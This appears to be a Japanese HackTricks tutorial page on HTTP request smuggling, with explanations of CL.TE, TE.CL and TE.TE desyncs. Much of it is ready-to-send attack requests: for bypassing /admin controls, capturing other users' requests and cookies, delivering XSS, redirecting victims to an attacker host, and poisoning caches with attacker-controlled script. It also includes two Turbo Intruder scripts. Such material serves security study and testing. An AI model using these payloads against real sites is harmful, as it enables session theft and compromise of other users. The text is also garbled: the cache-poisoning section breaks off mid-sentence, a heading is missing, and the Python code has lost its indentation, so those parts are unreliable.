# HTTPリクエストスマグリング / HTTPディスインクアタック

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## これは何か

この脆弱性は、**フロントエンドプロキシ**と**バックエンド**サーバー間の**非同期化**が、攻撃者がフロントエンドプロキシ（ロードバランサー/リバースプロキシ）によって**単一のリクエスト**として**解釈される**HTTP**リクエスト**を**送信**できるようにし、バックエンドサーバーによって**2つのリクエスト**として解釈されることを可能にします。\
これにより、ユーザーは**自分の後にバックエンドサーバーに到着する次のリクエストを変更**することができます。

### 理論

[**RFC仕様 (2161)**](https://tools.ietf.org/html/rfc2616)

> Transfer-EncodingヘッダーフィールドとContent-Lengthヘッダーフィールドの両方がメッセージで受信された場合、後者は無視されなければなりません。

**Content-Length**

> Content-Lengthエンティティヘッダーは、受信者に送信されたエンティティボディのサイズをバイト単位で示します。

**Transfer-Encoding: chunked**

> Transfer-Encodingヘッダーは、ペイロードボディを安全にユーザーに転送するために使用されるエンコーディングの形式を指定します。\
> Chunkedは、大きなデータが一連のチャンクで送信されることを意味します

### 現実

**フロントエンド**（ロードバランサー/リバースプロキシ）は_**content-length**_または_**transfer-encoding**_ヘッダーを**処理**し、**バックエンド**サーバーはもう一方を**処理**し、2つのシステム間で**非同期化**を引き起こします。\
これは非常に重大な問題であり、攻撃者はリバースプロキシにリクエストを送信することができ、バックエンドサーバーはそれを**2つの異なるリクエスト**として**解釈**します。この技術の**危険性**は、バックエンドサーバーが**2番目の注入されたリクエスト**を、次のクライアントから来たかのように**解釈**し、そのクライアントの**実際のリクエスト**が**注入されたリクエスト**の一部になることにあります。

### 特徴

HTTPでは**改行文字が2バイトで構成されている**ことを覚えておいてください:

* **Content-Length**: このヘッダーは**10進数**を使用してリクエストの**ボディ**の**バイト数**を示します。ボディは最後の文字で終わることが期待されており、リクエストの最後に**改行は必要ありません**。
* **Transfer-Encoding:** このヘッダーは**ボディ**内で**16進数**を使用して**次のチャンク**の**バイト数**を示します。**チャンク**は**改行で終わる**必要がありますが、この改行は長さの指標には**カウントされません**。この転送方法は**サイズ0のチャンクに続いて2つの改行で終わる**必要があります: `0`
* **Connection**: 私の経験に基づいて、リクエストスマグリングの最初のリクエストには**`Connection: keep-alive`**を使用することをお勧めします。

## 基本的な例

したがって、リクエストスマグリング攻撃には、単一のHTTPリクエストに`Content-Length`ヘッダーと`Transfer-Encoding`ヘッダーの両方を配置し、これらを操作してフロントエンドとバックエンドのサーバーがリクエストを異なる方法で処理するようにすることが含まれます。これを行う正確な方法は、2つのサーバーの動作に依存します:

* **CL.TE**: フロントエンドサーバーは`Content-Length`ヘッダーを使用し、バックエンドサーバーは`Transfer-Encoding`ヘッダーを使用します。
* **TE.CL**: フロントエンドサーバーは`Transfer-Encoding`ヘッダーを使用し、バックエンドサーバーは`Content-Length`ヘッダーを使用します。
* **TE.TE**: フロントエンドとバックエンドのサーバーは両方とも`Transfer-Encoding`ヘッダーをサポートしていますが、ヘッダーを何らかの方法で難読化することによって、サーバーの1つがそれを処理しないように誘導することができます。

### CL.TEの脆弱性

ここでは、**フロントエンド**サーバーは**`Content-Length`**ヘッダーを使用し、**バックエンド**サーバーは**`Transfer-Encoding`**ヘッダーを使用します。次のような単純なHTTPリクエストスマグリング攻撃を実行できます:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

`Content-Length`は**ボディのリクエスト長が30バイトである**ことを示しています（_HTTPでは改行を使用するので、新しい行ごとに2バイト_）、したがってリバースプロキシは**完全なリクエスト**をバックエンドに送信し、バックエンドは`Transfer-Encoding`ヘッダーを処理し、`GET /404 HTTP/1.1`を**次のリクエストの始まり**として残します（ちなみに、次のリクエストは`Foo:x<次のリクエストがここから始まる>`に追加されます）。

### TE.CLの脆弱性

ここでは、フロントエンドサーバーは`Transfer-Encoding`ヘッダーを使用し、バックエンドサーバーは`Content-Length`ヘッダーを使用します。次のような単純なHTTPリクエストスマグリング攻撃を実行できます:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

この場合、**リバースプロキシ**は**`Transfer-encoding`**が指示するように**全リクエスト**を**バックエンド**に送信します。しかし、**バックエンド**は`Content-Length`に示されているように**`7b`**（4バイト）のみを**処理**します。したがって、次のリクエストは`GET /404 HTTP/1.1`から始まるものになります。

_攻撃は`0`で終わる必要があるにもかかわらず、次のリクエストは**x**パラメータの追加値として追加されることに注意してください。_\
_また、埋め込まれたリクエストのContent-Lengthは、**x**パラメータに追加される次のリクエストの長さを示します。それが小さすぎると、数バイトしか追加されませんし、大きすぎる（次のリクエストの長さより大きい）場合、次のリクエストに対してエラーが発生します。_

### TE.TEの脆弱性

ここでは、フロントエンドとバックエンドのサーバーは両方とも`Transfer-Encoding`ヘッダーをサポートしていますが、ヘッダーを何らかの方法で難読化することによって、サーバーの1つがそれを処理しないように誘導することができます。\
`Transfer-Encoding`ヘッダーを難読化する方法は無限にあります。例えば:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

**TE**ヘッダーの**処理を停止する**サーバー（リバースプロキシまたはバッキング）に応じて、**CL.TEの脆弱性**または**TE.CLの脆弱性**が見つかります。

## HTTPリクエストスマグリングの検出

### タイミング技術を使用してCL.TEの脆弱性を検出する

アプリケーションがCL.TEバリアントのリクエストスマグリングに対して脆弱である場合、次のようなリクエストを送信すると、しばしば時間遅延が発生します：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
フロントエンドサーバーは`Content-Length`ヘッダーを使用しているため、このリクエストの一部のみを転送し、`0`を省略します。バックエンドサーバーは`Transfer-Encoding`ヘッダーを使用し、最初のチャンクを処理した後、次のチャンクの到着を待ちます。これにより観察可能な時間遅延が発生します。

時にはタイムアウトを得る代わりに、次のシナリオのように最終ホストから400の悪いリクエストを受け取ることがあります。ここでは、CL.TEペイロードが送信されます：

![](<../../.gitbook/assets/image (444).png>)

そして、レスポンスはhaproxyのバージョンまで含むエラーをボディ内に含むリダイレクトです：

![](<../../.gitbook/assets/image (443).png>)

### タイミング技術を使用してTE.CL脆弱性を見つける

アプリケーションがリクエストスマグリングのTE.CLバリアントに対して脆弱である場合、次のようなリクエストを送信すると、しばしば時間遅延が発生します：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
```markdown
フロントエンドサーバーが `Transfer-Encoding` ヘッダーを使用しているため、このリクエストの一部のみを転送し、`X` を省略します。バックエンドサーバーは `Content-Length` ヘッダーを使用し、メッセージボディにさらなるコンテンツがあると予想し、残りのコンテンツが到着するのを待ちます。これにより観測可能な時間遅延が発生します。

### HTTPリクエストスマグリングの脆弱性を探る

**タイミング技術が機能している**ことがわかったら、他のクライアントのリクエストを**変更できる**かどうかを**探る**必要があります。\
これを行う最も簡単な方法は、自分のリクエストを毒することです。例えば、`/`へのリクエストが404を返すようにします。\
[基本例](./#basic-examples)で、クライアントが他のリソースを要求しているときに`/404`を要求して404レスポンスを引き起こす`CL.TE`と`TE.CL`の例をすでに見ています。

**ノート**

他のリクエストへの干渉を通じてリクエストスマグリングの脆弱性を確認しようとする際には、いくつかの重要な考慮事項を念頭に置く必要があります：

* 「攻撃」リクエストと「通常」リクエストは、異なるネットワーク接続を使用してサーバーに送信する必要があります。両方のリクエストを同じ接続を通じて送信すると、脆弱性が存在することが証明されません。
* 「攻撃」リクエストと「通常」リクエストは、可能な限り同じURLとパラメータ名を使用する必要があります。これは、多くの現代のアプリケーションがURLとパラメータに基づいてフロントエンドのリクエストを異なるバックエンドサーバーにルーティングするためです。同じURLとパラメータを使用することで、リクエストが同じバックエンドサーバーによって処理される可能性が高まり、攻撃が機能するためには不可欠です。
* 「通常」リクエストをテストして「攻撃」リクエストからの干渉を検出する際には、アプリケーションが同時に受け取っている他のリクエスト、他のユーザーからのリクエストも含めて、レースになります。 「通常」リクエストは「攻撃」リクエストの直後に送信する必要があります。アプリケーションが忙しい場合は、脆弱性を確認するために複数回の試行が必要になるかもしれません。
* 一部のアプリケーションでは、フロントエンドサーバーがロードバランサーとして機能し、ロードバランシングアルゴリズムに従ってリクエストを異なるバックエンドシステムに転送します。 「攻撃」リクエストと「通常」リクエストが異なるバックエンドシステムに転送される場合、攻撃は失敗します。これは、脆弱性を確認する前に複数回試行する必要がある追加の理由です。
* 攻撃が成功して後続のリクエストに干渉した場合でも、それが干渉を検出するために送信した「通常」のリクエストではなかった場合、これはあなたの攻撃が他のアプリケーションユーザーに影響を与えたことを意味します。テストを続けると他のユーザーに混乱を招く可能性があり、注意を払う必要があります。

### ホップバイホップヘッダーを介した強制

ホップバイホップヘッダーを悪用することで、プロキシに対して **Content-LengthまたはTransfer-Encodingヘッダーを削除するよう指示し、HTTPリクエストスマグリングを悪用する可能性があります**。
```
```
Connection: Content-Length
```
ホップバイホップヘッダーについての**詳細情報**は、以下をご覧ください：

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTPリクエストスマグリングの悪用

### フロントエンドのセキュリティコントロールをバイパスするために

時々、**フロントエンドのプロキシがセキュリティチェックを行います**。HTTPリクエストスマグリングを悪用することで、これらの**保護をバイパス**することができます。例えば、この例では、外部から`/admin`に**アクセスできません**が、フロントエンドプロキシはそれをチェックしています。しかし、この**プロキシは埋め込まれたリクエストをチェックしていません**：

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### フロントエンドのリクエスト書き換えの明らかにする <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

多くのアプリケーションでは、**フロントエンドサーバーがリクエストの書き換えを行います**。通常は追加のリクエストヘッダーを追加することで、バックエンドサーバーに転送されます。\
一般的なこととして、`X-Forwarded-For: <クライアントのIP>`や類似のヘッダーをリクエストに**追加して**、バックエンドがクライアントのIPを知ることができます。\
時には、リクエストに**追加された新しい値を見つける**ことができれば、**保護をバイパス**し、**隠された情報**/**エンドポイント**に**アクセス**することができるかもしれません。

プロキシがリクエストをどのように書き換えているかを発見するためには、バックエンドがその値をレスポンスに反映する**POSTパラメーターを見つける**必要があります。その後、このパラメーターを最後のものとして使用し、このようなエクスプロイトを使用します：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

この場合、次のリクエストは`search=`の後に追加され、**そのパラメーターの値がレスポンスに反映される**ので、次のリクエストのヘッダーが**反映されます**。

埋め込まれたリクエストの`Content-Length`ヘッダーに示された長さだけが**反映される**ことに注意してください。小さい数値を使用すると、数バイトだけが反映されます。ヘッダーの全長よりも大きな数値を使用すると、埋め込まれたリクエストがエラーを出します。したがって、**小さい数値から始めて**、見たいものがすべて見えるまで**増やす**必要があります。\
また、この**技術はTE.CLの脆弱性でも利用可能**ですが、リクエストは`search=\r\n0`で終わる必要があります。しかし、改行文字に関係なく、値はsearchパラメーターに追加されます。

最後に、この攻撃では、フロントエンドプロキシがリクエストをどのように書き換えているかを学ぶために、自分自身を攻撃していることに注意してください。

### 他のユーザーのリクエストをキャプチャする <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

パラメーターの内容を保存するPOSTリクエストを見つけることができれば、そのパラメーターの値として次のリクエストを追加して、次のクライアントのクエストを保存することができます：

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

この場合、**commentパラメーター**の値は、ページ内の投稿のコメントに**保存される**ので、**次のリクエストの内容がコメントに表示されます**。

この技術の一つの制限は、通常、スマグルされたリクエストに適用されるパラメーター区切り文字までのデータのみがキャプチャされることです。URLエンコードされたフォーム送信の場合、これは`&`文字になります。つまり、被害者ユーザーのリクエストから保存される内容は、最初の`&`で終わります。これはクエリ文字列にも現れる可能性があります。

また、この**技術はTE.CLの脆弱性でも利用可能**ですが、リクエストは`search=\r\n0`で終わる必要があります。しかし、改行文字に関係なく、値はsearchパラメーターに追加されます。

### 反射型XSSに対するHTTPリクエストスマグリングの利用

ウェブページが**反射型XSSにも脆弱**である場合、HTTPリクエストスマグリングを悪用してウェブのクライアントを攻撃することができます。HTTPリクエストスマグリングからの反射型XSSの悪用にはいくつかの利点があります：

* **被害者ユーザーとのやり取りは必要ありません**
* 通常の反射型XSS攻撃では簡単に制御できないリクエストの部分、例えばHTTPリクエストヘッダーなどのXSSの挙動を**悪用**するために使用できます。

User-Agentヘッダーで反射型XSSに脆弱なウェブがある場合、このペイロードを使用して悪用することができます：

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### オンサイトリダイレクトをオープンリダイレクトに変えるためのHTTPリクエストスマグリングの利用 <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

多くのアプリケーションは、一つのURLから別のURLへのオンサイトリダイレクトを行い、リクエストの`Host`ヘッダーからホスト名をリダイレクトURLに配置します。これの一例は、ApacheやIISウェブサーバーのデフォルトの挙動で、トレーリングスラッシュのないフォルダーに対するリクエストが、トレーリングスラッシュを含む同じフォルダーへのリダイレクトを受ける場合です：

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

この挙動は通常、無害と考えられていますが、リクエストスマグリング攻撃で他のユーザーを外部ドメインにリダイレクトするために悪用することができます。例えば：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

スマグルされたリクエストは、攻撃者のウェブサイトへのリダイレクトをトリガーし、バックエンドサーバーによって処理される次のユーザーのリクエストに影響を与えます。例えば：

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

ここでは、ユーザーのリクエストはウェブサイトのページによってインポートされたJavaScriptファイルでした。攻撃者は、応答で自分のJavaScriptを返すことで、被害者ユーザーを完全に侵害することができます。

### ウェブキャッシュポイズニングを行うためのHTTPリクエストスマグリングの利用 <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

**フロントエンドインフラストラクチャの一部がコンテンツのキャッシングを行っている**場合（一般的にはパフォーマンス上の理由から）、サーバーのレスポンスを変更してそのキャッシュを**毒することが可能かもしれません**。

すでに、サーバーからの期待される返り値を404に変更する方法を見てきました（[基本例](./#basic-examples)）。同様の方法で、`/static/include.js`を要求している毒されたリクエストが`/index.html`の内容を返すようにすることができます。このようにして、`/static/include.js`の内容が`/index.html`の内容でキャッシュされ、クライアントにとって`/static/include.js`がアクセス不可能になります（DoS？）。

これは、いくつかの**オープンリダイレクト**や、いくつかの**オンサイトリダイレクトからのオープンリダイレクト**（前のセクション）が見つかった場合にさらに興味深いです。なぜなら、`/static/include.js`の**キャッシュ値を、攻撃者が制御するスクリプトのものに変更**することができるかもしれないからです（新しいバージョンの`/static/include.js`をダウンロードしようとするすべてのクライアントに対する**一般的なXSS**）。

この例では、**キャッシュポイズニング + オンサイトリダイレクトからのオープンリダイレクト**を悪用して、`/static/include.js`のキャッシュの内容を攻撃者が**制御するJSコードで提供する**方法を示します：

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

埋め込まれたリクエストが`/post/next?postId=3`を要求していることに注意してください。このリクエストは`/post?postId=4`にリダイレクトされ、**ホストヘッダーの値を使用してドメインを示します**。したがって、攻撃
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## 詳細情報

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[こちらの画像出典](https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## ツール

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): このツールは文法ベースのHTTP Fuzzerで、リクエストスマグリングの奇妙な不一致を見つけるのに役立ちます。

## 参考文献

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
